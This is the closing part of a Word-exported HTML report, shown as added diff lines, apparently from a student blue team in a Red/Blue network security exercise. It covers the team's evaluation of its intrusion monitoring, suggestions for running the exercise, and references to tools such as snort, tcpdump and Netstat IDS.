+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Evaluation<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:16.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:11.0pt;
+mso-bidi-font-size:10.0pt'>Our team was able to monitor and detect a lot of
+attacks. The warnings that we gave to the host teams, helped them prepare for
+the attack and gave them good directions about what to look for in their host.
+The responsibilities in the network team were well distributed and organized,
+and this ensured that the logs collected were not overlapping and redundant.
+The logs produced by Netstat were most helpful in re-constructing the sequence
+of steps made by the red-team to accomplish the attack. Other tools could only
+provide us with pieces of information that were not very helpful in the
+re-constructing the attack. The log files that were collected were complete and
+provided a great source for the post-mortem analysis. </span><b
+style='mso-bidi-font-weight:normal'><span style='font-size:12.0pt;mso-bidi-font-size:
+10.0pt'><o:p></o:p></span></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>Miscellaneous<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify;text-indent:-.25in;
+mso-list:l15 level1 lfo18;tab-stops:list .5in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>The
+activities of the exercise should be organized better to promote interaction
+between subgroups of a team.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify;text-indent:-.25in;
+mso-list:l15 level1 lfo18;tab-stops:list .5in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>The
+blue team should be given a chance to prevent these attacks as the case would
+be in real life.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify;text-indent:-.25in;
+mso-list:l15 level1 lfo18;tab-stops:list .5in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>Red/Blue
+exercise should be one week earlier, to leave more room for final project
+testing.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.5in;text-align:justify;text-indent:-.25in;
+mso-list:l15 level1 lfo18;tab-stops:list .5in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>The
+IP-addresses of the hosts that we were protecting were changed just before the
+war without sufficient notice for us to change our programs and rules.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='text-align:justify'><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l0 level1 lfo1;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:16.0pt;mso-bidi-font-size:10.0pt;font-family:Symbol'>·<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span><![endif]><b
+style='mso-bidi-font-weight:normal'><u><span style='font-size:16.0pt;
+mso-bidi-font-size:10.0pt'>References<o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='text-align:justify'><b style='mso-bidi-font-weight:
+normal'><u><span style='font-size:18.0pt;mso-bidi-font-size:10.0pt'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></u></b></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[1]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span class=MsoHyperlink><span style='color:blue'>http://<a
+href="http://www.snort.org/">www.snort.org</a></span></span><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'> – For downloading rule-sets
+and preprocessors for snort<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[2]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span class=MsoHyperlink><span style='color:blue'>http://<a
+href="http://www.tcpdump.org/">www.tcpdump.org</a></span></span><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'> – tcpdump and libpcap<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[3]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>README
+files of Netstat IDS<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[4]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>man
+pages of snort, tcpdump, libpcap, hosts_options, identd, tcpd, hosts.allow<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[5]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>Practical
+Unix and Internet Security – Book by Garfinkel and Spafford.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[6]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span class=MsoHyperlink><span style='color:blue'><a
+href="http://www.whitehats.com/ids/index.html">http://www.whit<span
+style='mso-bookmark:_Hlt508954902'>e</span>hats.com/ids/index.html</a><![if !supportNestedAnchors]><a
+name="_Hlt508954902"></a><![endif]></span></span><span style='font-size:12.0pt;
+mso-bidi-font-size:10.0pt'> -- Some alternatives and additions to the snort.org
+signatures.<o:p></o:p></span></p>
+
+<p class=MsoNormal style='margin-left:.25in;text-align:justify;text-indent:
+-.25in;mso-list:l18 level1 lfo15;tab-stops:list .25in'><![if !supportLists]><span
+style='font-size:12.0pt;mso-bidi-font-size:10.0pt'>[7]<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;
+</span></span><![endif]><span style='font-size:12.0pt;mso-bidi-font-size:10.0pt'><a
+href="http://www.norz.org/software/newdupl.pl"><span style='font-size:10.0pt'>http://www.norz.org/software/newdupl.pl</span></a><span
+style="mso-spacerun: yes">  </span>-- Tool to remove duplicate rules and speed
+things up a little.<o:p></o:p></span></p>
+
+</div>
+
+</body>
+
+</html>
